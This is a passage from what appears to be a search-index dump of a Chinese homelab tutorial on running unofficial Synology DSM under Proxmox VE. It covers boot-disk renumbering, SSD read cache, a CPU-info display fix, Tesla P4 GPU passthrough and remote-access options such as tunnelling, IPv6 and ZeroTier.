<p>\u200b\u56fd\u5149\u200b\u731c\u6d4b\u200b\u662f\u56e0\u4e3a\u200b\u8fd9\u4e2a\u200b\u5f15\u5bfc\u76d8\u200b\u592a\u5c0f\u200b\u4e86\u200b\uff0c\u200b\u53ea\u80fd\u200b\u4f5c\u4e3a\u200b\u5f15\u5bfc\u200b\uff0c\u200b\u7fa4\u6656\u200b\u6ca1\u200b\u628a\u200b\u4ed6\u200b\u5f53\u56de\u4e8b\u200b\u3002</p>"},{"location":"6/3/#sata0","title":"\u817e\u51fa\u200b sata0","text":"<p>\u200b\u4e0d\u8fc7\u200b\u8fd9\u4e2a\u200b\u53ef\u6076\u200b\u7684\u200b\u5f15\u5bfc\u76d8\u200b\u786e\u5b9e\u200b\u5360\u200b\u4e86\u200b sata0 \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f85\u4f1a\u200b\u7ed9\u200b\u4ed6\u200b\u6539\u4e3a\u200b sata4 \u200b\u7f16\u53f7\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8ba9\u200b sata0\u3001sata1\u3001sata2\u3001sata3 \u200b\u6b63\u5e38\u200b\u88ab\u200b\u7fa4\u6656\u200b\u8bc6\u522b\u200b\u4e3a\u200b\u677f\u8f7d\u200b\u786c\u76d8\u200b\u4e86\u200b\u3002 </p> <p>\u200b\u76f4\u63a5\u200b\u7f16\u8f91\u200b\u865a\u62df\u673a\u200b\u914d\u7f6e\u200b\uff1a</p> Bash<pre><code>nano /etc/pve/qemu-server/100.conf\n</code></pre> <p>\u200b\u624b\u52a8\u200b\u5c06\u200b sata0 \u200b\u6539\u4e3a\u200b sata4\uff1a</p> <p> </p>"},{"location":"6/3/#sata-0123","title":"\u6dfb\u52a0\u200b sata 0\u30011\u30012\u30013","text":"<p>\u200b\u6211\u4eec\u200b\u8fd9\u91cc\u200b\u9700\u8981\u200b\u518d\u200b\u6dfb\u52a0\u200b 4 \u200b\u5757\u200b SSD\uff0c\u200b\u5f53\u7136\u200b SSD \u200b\u4e5f\u200b\u4e0d\u662f\u200b\u767d\u200b\u6dfb\u52a0\u200b\u7684\u200b\uff0c\u200b\u7528\u6765\u200b\u505a\u200b\u7f13\u5b58\u200b\u4e5f\u200b\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b SSD \u200b\u7f13\u5b58\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5751\u200b\u548c\u200b\u57fa\u7840\u77e5\u8bc6\u200b\u5f97\u200b\u4e86\u89e3\u200b\u4e00\u4e0b\u200b\uff1a</p> <ol> <li>SSD \u200b\u5199\u5165\u200b\u653e\u5927\u200b\u95ee\u9898\u200b<ul> <li>\u200b\u7f13\u5b58\u200b\u8981\u200b\u4fdd\u7559\u200b\u4e00\u5b9a\u200b\u7684\u200b\u672a\u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5206\u914d\u200b 80%\uff0c\u200b\u9632\u6b62\u200b\u5199\u5165\u200b\u653e\u5927\u200b\u3002\u200b\u662f\u56e0\u4e3a\u200b\u7fa4\u6656\u200b\u7684\u200b\u7f13\u5b58\u200b\u81ea\u52a8\u200b\u91ca\u653e\u200b\u901f\u5ea6\u200b\u5f88\u200b\u6162\u200b\uff0c\u200b\u5f53\u200b\u7f13\u5b58\u200b\u5360\u7528\u7387\u200b 99%\u200b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u53cd\u590d\u200b\u5bf9\u200b\u4e00\u4e9b\u200b\u5757\u200b\u8fdb\u884c\u200b\u79fb\u9664\u200b\uff0c\u200b\u5199\u5165\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u786c\u76d8\u200b\u7684\u200b\u5065\u5eb7\u200b\u5ea6\u200b\u4e0b\u964d\u200b\u3002</li> </ul> </li> <li>SSD \u200b\u5efa\u8bae\u200b\u5f00\u542f\u200b\u53ea\u8bfb\u200b\u7f13\u5b58\u200b<ul> <li>\u200b\u53ea\u8bfb\u200b\u7f13\u5b58\u200b\u9648\u672c\u200b\u5f88\u200b\u4f4e\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b 1 \u200b\u5757\u200b\u786c\u76d8\u200b\uff0c\u200b\u800c\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u9700\u8981\u200b 2 \u200b\u5757\u200b\u786c\u76d8\u200b\u3002</li> <li>\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u4e3b\u8981\u200b\u662f\u200b\u5728\u200b\u7fa4\u6656\u200b\u7528\u4e8e\u200b\u7f51\u9875\u200b\u670d\u52a1\u200b\uff0ciscsi\uff0c\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u6709\u200b\u8f83\u200b\u597d\u200b\u7684\u200b\u52a0\u901f\u200b\u4f5c\u7528\u200b\uff0c\u200b\u63d0\u5347\u200b\u6548\u679c\u200b\u6709\u9650\u200b\u3002</li> <li>\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u662f\u200b\u548c\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u5e76\u200b\u5728\u200b\u4e00\u8d77\u200b\u7684\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u5982\u679c\u200b SSD \u200b\u7a81\u7136\u200b GG\uff0c\u200b\u4e0e\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u76f8\u8fde\u200b\u7684\u200b\u8fd9\u4e2a\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u4f1a\u200b\u6302\u6389\u200b\u3002</li> <li>\u200b\u5927\u90e8\u5206\u200b\u5bb6\u7528\u200b\u573a\u666f\u200b\uff0c\u200b\u505a\u8bfb\u200b\u7f13\u5b58\u200b\u5c31\u591f\u200b\u4e86\u200b\uff0c\u200b\u8bfb\u5199\u200b\u7f13\u5b58\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u5e2e\u52a9\u200b\uff0c\u200b\u53cd\u800c\u200b\u589e\u52a0\u200b\u4e86\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u6302\u6389\u200b\u7684\u200b\u98ce\u9669\u200b\u3002</li> </ul> </li> </ol> <p>\u200b\u6839\u636e\u4e0a\u8ff0\u200b\u77e5\u8bc6\u70b9\u200b\u6211\u4eec\u200b\u91cd\u65b0\u200b\u8bbe\u8ba1\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u7684\u200b\u786c\u76d8\u200b\u7ed3\u6784\u200b\uff1a</p> <p> </p> <p>\u200b\u4e3b\u8981\u200b\u5c31\u200b\u6dfb\u52a0\u200b\u4e86\u200b 4 \u200b\u4e2a\u200b PVE \u200b\u7684\u200b 125GB \u200b\u865a\u62df\u200b SSD\uff0c\u200b\u6253\u7b97\u200b\u7ed9\u200b\u5b58\u50a8\u200b\u6c60\u200b1\u30012\u30013\u30014 \u200b\u505a\u200b 125 x 80% = 120GB SSD \u200b\u7f13\u5b58\u200b\u3002\u200b\u53e6\u5916\u200b\u76f4\u901a\u200b\u7684\u200b\u786c\u76d8\u200b\u91cc\u9762\u200b\u6709\u200b 1 \u200b\u4e2a\u200b 256GB \u200b\u7684\u200b\u5c0f\u200b\u724c\u5b50\u200b SATA  SSD \u200b\u6b63\u597d\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u901a\u200b\u7ed9\u200b\u5b58\u50a8\u200b\u6c60\u200b 6 \u200b\u505a\u200b 200GB \u200b\u7684\u200b SSD \u200b\u7f13\u5b58\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u6dfb\u52a0\u200b\u786c\u76d8\u200b\u52fe\u9009\u200b\u7684\u200b\u4e00\u4e9b\u200b\u53c2\u6570\u200b\uff1a</p> <p> </p> <ol> <li>\u200b\u52fe\u9009\u200b \u300cSSD \u200b\u4eff\u771f\u200b\u300d\uff0c\u200b\u5fc5\u9009\u200b\u3002\u200b\u8fd9\u6837\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u7fa4\u6656\u200b\u8bc6\u522b\u200b\u4f60\u200b\u4e3a\u200b SSD\uff0c\u200b\u4ece\u800c\u200b\u624d\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5176\u200b\u4f5c\u4e3a\u200b\u7f13\u5b58\u200b\u76d8\u200b\u3002</li> <li>\u200b\u52fe\u9009\u200b \u300c\u200b\u4e22\u5f03\u200b\u300d\uff0c\u200b\u53ef\u200b\u9009\u200b\uff0c\u200b\u5f00\u542f\u200b SSD  TRIM \u200b\u652f\u6301\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e00\u79cd\u200b\u5148\u8fdb\u200b\u7684\u200b\u5b58\u50a8\u6280\u672f\u200b</li> <li>\u200b\u7f13\u5b58\u200b\u7c7b\u578b\u200b\u9009\u62e9\u200b\u4e3a\u200b\uff1a\u300cWrite back\u300d\uff0c\u200b\u662f\u200b\u4e00\u4e2a\u200b\u63d0\u9ad8\u200b\u865a\u62df\u673a\u200b IO \u200b\u7684\u200b\u4e00\u79cd\u200b\u975e\u5e38\u200b\u6709\u6548\u200b\u7684\u200b\u53c2\u6570\u200b</li> </ol> <p>\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\uff0c\u200b\u6dfb\u52a0\u200b\u5b8c\u200b\u5269\u4e0b\u200b 3 \u200b\u5757\u200b\u786c\u76d8\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u4e0d\u8981\u200b\u5fd8\u8bb0\u200b\u4fee\u6b63\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u73b0\u5728\u200b\u7684\u200b\u5f15\u5bfc\u200b\uff0c\u200b\u5df2\u7ecf\u200b\u4ece\u200b\u539f\u6765\u200b\u7684\u200b sata0 \u200b\u53d8\u4e3a\u200b sata4 \u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"6/3/#_3","title":"\u6700\u7ec8\u200b\u6548\u679c","text":"<p>\u200b\u6700\u7ec8\u200b\u6211\u4eec\u200b\u89e3\u51b3\u200b\u4e86\u200b\u7fa4\u6656\u200b\u7684\u200b\u786c\u76d8\u200b\u4fe1\u606f\u200b\u91cc\u9762\u200b\u8bc6\u522b\u200b\u4e0d\u5230\u200b\u6211\u4eec\u200b\u786c\u76d8\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5f3a\u8feb\u75c7\u200b\u72c2\u559c\u200b\uff1a</p> <p> </p> <p>\u200b\u63d0\u793a\u200b\u672a\u200b\u521d\u59cb\u5316\u200b\u4e0d\u8981\u7d27\u200b\uff0c\u200b\u6211\u4eec\u200b\u53c2\u8003\u200b\u4e0b\u9762\u200b\u7684\u200b SSD \u200b\u7f13\u5b58\u200b\u7ed9\u200b\u4ed6\u4eec\u200b\u90fd\u200b\u521d\u59cb\u5316\u200b\u4e00\u4e0b\u200b\uff1a </p>"},{"location":"6/3/#ssd","title":"SSD \u200b\u7f13\u5b58","text":"<p>\u200b\u65e2\u7136\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u7f13\u5b58\u200b\u5c31\u200b\u5f97\u200b\u5229\u7528\u200b\u8d77\u6765\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4ee5\u200b\u5b58\u50a8\u200b\u6c60\u200b 1 \u200b\u4e3a\u200b\u4f8b\u6765\u200b\u6dfb\u52a0\u200b SSD \u200b\u7f13\u5b58\u200b\u3002\u200b\u5148\u200b\u521b\u5efa\u200b SSD \u200b\u7f13\u5b58\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u7ed9\u200b\u5b58\u50a8\u7a7a\u95f4\u200b1\u200b\u88c5\u8f7d\u200b\u52a0\u901f\u200b\u4e00\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u300c\u200b\u53ea\u8bfb\u200b\u7f13\u5b58\u200b\u300d\uff1a</p> <p> </p> <p>\u200b\u53ea\u6709\u200b 1 \u200b\u4e2a\u200b\u786c\u76d8\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u9009\u62e9\u200b\u300cBasic\u300d\u200b\u7c7b\u578b\u200b\uff1a</p> <p> </p> <p>\u200b\u9009\u62e9\u200b\u6211\u4eec\u200b\u8981\u200b\u6dfb\u52a0\u200b\u7684\u200b SSD\uff1a</p> <p> </p> <p>\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u5199\u5165\u200b\u653e\u5927\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5206\u914d\u200b\u5927\u5c0f\u200b\u4e3a\u200b\uff1a125 x 80% = 120GB \u200b\u5927\u5c0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u7ec8\u200b\u6dfb\u52a0\u200b\u597d\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u4ee5\u6b64\u7c7b\u63a8\u200b\uff0c\u200b\u6211\u4eec\u200b\u7ed9\u200b\u5176\u4ed6\u200b\u5b58\u50a8\u200b\u6c60\u200b\u4e5f\u200b\u6dfb\u52a0\u200b\u5bf9\u5e94\u200b\u7684\u200b SSD \u200b\u7f13\u5b58\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5f3a\u8feb\u75c7\u200b\u7ec8\u4e8e\u200b\u8212\u670d\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b    </p> <p>\u200b\u7136\u540e\u200b\u518d\u200b\u914d\u7f6e\u200b\u4e00\u4e0b\u200b\u5bb6\u200b\u76ee\u5f55\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u6bcf\u4e2a\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u65b0\u5efa\u200b\u81ea\u5df1\u200b\u7684\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6700\u7ec8\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"6/4/","title":"CPU\u200b\u4fee\u6b63","text":""},{"location":"6/4/#_1","title":"\u5f15\u51fa\u200b\u95ee\u9898","text":"<p>\u200b\u7ec6\u5fc3\u200b\u7684\u200b\u7f51\u53cb\u4f1a\u200b\u53d1\u73b0\u200b\u6211\u4eec\u200b PVE \u200b\u5b89\u88c5\u200b\u7684\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u7684\u200b CPU \u200b\u578b\u53f7\u200b\u548c\u200b CPU \u200b\u5185\u6838\u200b\u6570\u200b\u548c\u200b\u6211\u4eec\u200b PVE \u200b\u91cc\u9762\u200b\u63d0\u4f9b\u200b\u7684\u200b\u4fe1\u606f\u200b\u662f\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u5f15\u5bfc\u200b\u672c\u8eab\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5c3d\u91cf\u200b\u53bb\u200b\u6a21\u62df\u200b\u771f\u5b9e\u200b\u7684\u200b\u767d\u7fa4\u6656\u200b\u3002\u200b\u4e0d\u8fc7\u200b\u5462\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u7ea0\u6b63\u200b\u4e00\u4e0b\u200b\uff0c\u200b\u8ba9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u6b63\u786e\u200b\u8bc6\u522b\u200b\u5230\u200b\u6211\u4eec\u200b\u7684\u200b CPU \u200b\u578b\u53f7\u200b\u4ee5\u53ca\u200b\u6838\u5fc3\u200b\u6570\u200b\u3002</p>"},{"location":"6/4/#vm","title":"VM \u200b\u914d\u7f6e","text":"<p>\u200b\u9996\u5148\u200b\u786e\u4fdd\u200b\u6211\u4eec\u200b\u7684\u200b VM \u200b\u865a\u62df\u673a\u200b\u7684\u200b CPU \u200b\u9700\u8981\u200b\u9009\u62e9\u200b host \u200b\u7c7b\u578b\u200b\uff0c\u200b\u8fd9\u6837\u200b\u624d\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u8bc6\u522b\u200b\u5230\u200b\u6211\u4eec\u200b\u7269\u7406\u200b\u673a\u200b\u7684\u200b CPU \u200b\u771f\u6b63\u200b\u7684\u200b\u578b\u53f7\u200b\uff0c\u200b\u6b64\u5916\u200b\u975e\u200b\u5355\u8def\u200b CPU \u200b\u4e3b\u673a\u200b\u8fd8\u200b\u5efa\u8bae\u200b\u542f\u7528\u200b NUMA \uff1a</p> <p> </p>"},{"location":"6/4/#_2","title":"\u7ea0\u6b63\u200b\u578b\u53f7","text":"<p>\u200b\u6211\u4eec\u200b\u6b64\u6b21\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u5f00\u6e90\u200b\u9879\u76ee\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1ahttps://github.com/FOXBI/ch_cpuinfo</p> <p>\u200b\u4e0b\u8f7d\u200b\u4e0a\u200b\u4f20\u5230\u200b DSM \u200b\u4e2d\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u6267\u884c\u200b ch_cpuinfo \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5de5\u5177\u200b\u4ea4\u4e92\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u4e0d\u200b\u61c2\u200b\u7684\u200b\u5730\u65b9\u200b\u8c37\u6b4c\u200b\u7ffb\u8bd1\u200b\u4e00\u4e0b\u200b\u5c31\u200b\u61c2\u200b\u4e86\u200b\u3002\u200b\u7b2c\u4e00\u6b21\u200b\u4f7f\u7528\u200b\u53ea\u200b\u9700\u200b\u6839\u636e\u200b\u63d0\u793a\u200b\u5f15\u5bfc\u200b\u5148\u540e\u200b\u8f93\u5165\u200b\uff1a1 \u200b\u7136\u540e\u200b y \u200b\u5373\u53ef\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u4e4b\u524d\u200b\u5df2\u7ecf\u200b\u5b89\u88c5\u200b\u8fc7\u200b\u8fd9\u4e2a\u200b\u5de5\u5177\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0b\u9762\u200b\u56fe\u4e2d\u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b 2 \u200b\u7136\u540e\u200b y\uff1a</p> <p> </p> <p>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6210\u529f\u200b\u6216\u8005\u200b\u663e\u793a\u200b\u6709\u200b BUG \u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e0d\u59a8\u200b\u540e\u9000\u200b\u51e0\u4e2a\u200b\u7248\u672c\u200b\u770b\u770b\u200b\uff0c\u200b\u6700\u7ec8\u200b\u56fd\u5149\u200b\u6211\u200b\u5728\u200b 4.0.0 \u200b\u7248\u672c\u200b\u4e2d\u200b\uff0c\u200b\u9ed1\u7fa4\u6656\u200b  DSM \u200b\u5df2\u7ecf\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u663e\u793a\u200b\u6211\u4eec\u200b\u7684\u200b CPU \u200b\u578b\u53f7\u200b\u548c\u200b\u6838\u5fc3\u200b\u6570\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u5176\u5b9e\u200b\u6838\u5fc3\u200b\u539f\u7406\u200b\u5c31\u662f\u200b\u4fee\u6539\u200b admin_center.js \u200b\u6587\u4ef6\u200b\u5185\u5bb9\u200b\uff1a</p> Bash<pre><code>vim /usr/syno/synoman/webman/modules/AdminCenter/admin_center.js\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u81ea\u5b9a\u4e49\u200b\u6211\u4eec\u200b\u60f3\u8981\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u6539\u5b8c\u200b\u66ff\u6362\u200b\u56de\u53bb\u200b\u5c31\u884c\u4e86\u200b\u3002</p>"},{"location":"6/5/","title":"\u76f4\u901a\u200b\u72ec\u663e","text":""},{"location":"6/5/#_1","title":"\u5b89\u88c5\u200b\u5957\u4ef6","text":"<p>DVA3221 \u200b\u673a\u578b\u200b\u5b98\u65b9\u200b\u662f\u200b\u9ed8\u8ba4\u200b\u652f\u6301\u200b\u72ec\u663e\u200b\u9a71\u52a8\u200b\u7684\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b NVIDIA Runtime Library \u200b\u5957\u4ef6\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u5176\u4ed6\u200b\u539f\u751f\u200b\u4e0d\u200b\u652f\u6301\u200b N \u200b\u5361\u53bb\u200b\u7684\u200b\u673a\u578b\u200b\u5982\u200b\uff1aDS918+\u3001DS920+ \u200b\u7b49\u200b\u673a\u578b\u200b\u4e5f\u200b\u662f\u200b\u53ef\u4ee5\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b\u8fd9\u4e2a\u200b\u5957\u4ef6\u200b\u6765\u200b\u9a71\u52a8\u200b N \u200b\u5361\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b98\u65b9\u200b\u6e90\u200b\u91cc\u9762\u200b\u80af\u5b9a\u200b\u662f\u200b\u4e0d\u5e26\u200b\u8fd9\u4e2a\u200b N \u200b\u5361\u200b\u5957\u4ef6\u200b\u7684\u200b\uff0c\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u6dfb\u52a0\u200b\u7b2c\u4e09\u65b9\u200b\u7684\u200b DSM \u200b\u6e90\u200b\uff1ahttps://spk7.imnks.com/</p>"},{"location":"6/5/#_2","title":"\u76f4\u901a\u200b\u72ec\u663e","text":"<p>\u200b\u9996\u5148\u200b PVE VM \u200b\u786c\u4ef6\u200b\u9009\u62e9\u200b\u300c\u200b\u6dfb\u52a0\u200b\uff1aPCI\u200b\u8bbe\u5907\u200b\u300d\uff0c\u200b\u9009\u62e9\u200b\u6211\u4eec\u200b\u7684\u200b Tesla P4 \u200b\u663e\u5361\u200b\uff1a</p> <p> </p> <p>\u200b\u53ea\u200b\u52fe\u9009\u200b\u6240\u6709\u200b\u529f\u80fd\u200b\u548c\u200b ROM-Bar \u200b\u5373\u53ef\u200b\uff1a</p> <p> </p>"},{"location":"6/5/#_3","title":"\u76f4\u901a\u200b\u6548\u679c","text":"<p>\u200b\u7136\u540e\u200b\u6211\u4eec\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5728\u200b\u63a7\u5236\u9762\u677f\u200b\u7684\u200b\u4fe1\u606f\u4e2d\u5fc3\u200b\u770b\u5230\u200b\u6211\u4eec\u200b\u76f4\u901a\u200b\u7684\u200b Tesla P4 \u200b\u663e\u5361\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u4f7f\u7528\u200b DSM \u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u8bc6\u522b\u200b\u6211\u4eec\u200b\u6dfb\u52a0\u200b\u7684\u200b\u663e\u5361\u200b\uff1a</p> Bash<pre><code>nvidia-smi\n</code></pre> <p>\u200b\u540e\u9762\u200b\u56fd\u5149\u200b\u6211\u200b\u6d4b\u8bd5\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e24\u5757\u200b N \u200b\u5361\u200b\u90fd\u200b\u662f\u200b\u6b63\u5e38\u200b\u8bc6\u522b\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u6dfb\u52a0\u200b\u4e24\u5757\u200b\u610f\u4e49\u200b\u4e0d\u200b\u5927\u200b\uff0c\u200b\u6b63\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b 1 \u200b\u4e2a\u200b Tesla P4 \u200b\u5c31\u200b\u5b8c\u5168\u200b\u8db3\u591f\u200b\u6211\u4eec\u200b\u65e5\u5e38\u200b\u4f7f\u7528\u200b\u4e86\u200b\uff1a</p> <p> </p>"},{"location":"6/6/","title":"\u8fdc\u7a0b\u200b\u8bbf\u95ee","text":""},{"location":"6/6/#_1","title":"\u7efc\u5408\u200b\u5bf9\u6bd4","text":"\u8bbf\u95ee\u200b\u65b9\u5f0f\u200b \u200b\u4f7f\u7528\u200b\u4f53\u9a8c\u200b \u200b\u4f7f\u7528\u200b\u95e8\u69db\u200b \u200b\u82b1\u751f\u58f3\u200b\uff08\u200b\u514d\u8d39\u7248\u200b\uff09 \u2b50\ufe0f \u200b\u4f4e\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u5373\u53ef\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b \u200b\u7eaf\u200b IPv6 \u200b\u8bbf\u95ee\u200b \u2b50\ufe0f\u2b50\ufe0f \u200b\u9ad8\u200b\uff0c\u200b\u9700\u8981\u200b\u6709\u200b IPv6 \u200b\u516c\u7f51\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u624d\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u800c\u4e14\u200b IPv6 \u200b\u5f88\u957f\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u80fd\u200b\u4f1a\u53d8\u200b DDNS \u200b\u8f6c\u200b IPv6 \u2b50\ufe0f\u2b50\ufe0f\u2b50\ufe0f \u200b\u4e2d\u200b\uff0c\u200b\u9700\u8981\u200b\u6709\u200b IPv6 \u200b\u516c\u7f51\u200b\u7684\u200b\u6d4f\u89c8\u5668\u200b\u624d\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u4f46\u662f\u200b\u8f93\u5165\u200b\u57df\u540d\u200b\u5373\u53ef\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b ZeroTier \u200b\u7ec4\u7f51\u200b \u2b50\ufe0f\u2b50\ufe0f\u2b50\ufe0f\u2b50\ufe0f \u200b\u9ad8\u200b\uff0c\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b ZeroTier \u200b\u5ba2\u6237\u7aef\u200b\u7ec4\u7f51\u200b\u624d\u200b\u53ef\u4ee5\u200b\uff0c\u200b\u4f46\u662f\u200b\u65e0\u200b IPv6 \u200b\u9650\u5236\u200b\uff0c\u200b\u901f\u5ea6\u200b\u4e5f\u200b\u4e0d\u9519"},{"location":"6/6/#_2","title":"\u82b1\u751f\u58f3\u200b\u7a7f\u900f","text":"<p>\u200b\u9996\u5148\u200b\u5b89\u88c5\u200b\u597d\u200b\u300c\u200b\u82b1\u751f\u58f3\u200b\u300d\u200b\u5957\u4ef6\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u662f\u200b\u514d\u8d39\u200b\u7684\u200b\u4ea7\u54c1\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd8\u662f\u200b\u6709\u200b\u6d41\u91cf\u200b\u9650\u5236\u200b\u7684\u200b\uff1a</p> <p> \u200b\u800c\u4e14\u200b\u5b98\u7f51\u200b\u67e5\u770b\u200b\u4e00\u4e0b\u200b\u53d1\u73b0\u200b\u5e26\u5bbd\u200b\u662f\u200b 1M \u200b\u7684\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0d\u8fc7\u200b\u662f\u200b\u514d\u8d39\u200b\u7684\u200b\uff0c\u200b\u800c\u4e14\u200b\u4f7f\u7528\u200b\u95e8\u69db\u200b\u5f88\u200b\u4f4e\u200b\uff0c\u200b\u786e\u5b9e\u200b\u6bd4\u8f83\u200b\u9002\u5408\u200b\u5c0f\u767d\u200b\u6765\u8bf4\u200b\u4f7f\u7528\u200b\u3002</p> <p> </p> <p>\u200b\u5efa\u8bae\u200b\u6709\u200b\u80fd\u529b\u200b\u6298\u817e\u200b\u7684\u200b\u670b\u53cb\u200b\u53ef\u4ee5\u200b\u770b\u770b\u200b\u4e0b\u9762\u200b\u7684\u200b\u59ff\u52bf\u200b\uff0c\u200b\u7814\u7a76\u200b\u5176\u4ed6\u200b\u4f53\u9a8c\u200b\u66f4\u68d2\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002  </p>"},{"location":"6/6/#ipv6","title":"\u7eaf\u200b IPv6 \u200b\u8bbf\u95ee","text":"<p>\u200b\u56e0\u4e3a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u6ca1\u6709\u200b\u516c\u7f51\u200b\u7684\u200b IPv4 \u200b\u5730\u5740\u200b\uff0c\u200b\u4f46\u662f\u200b\u5374\u200b\u5206\u914d\u200b\u4e86\u200b IPv6 \u200b\u5730\u5740\u200b\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b IPv6 \u200b\u90fd\u200b\u662f\u200b\u516c\u7f51\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u7684\u200b\uff0c\u200b\u6d4f\u89c8\u5668\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b IPv6 \u200b\u5730\u5740\u200b\uff1a</p> Bash<pre><code>http://[IPv6\u200b\u5730\u5740\u200b]:\u200b\u7aef\u53e3\u200b\n</code></pre> 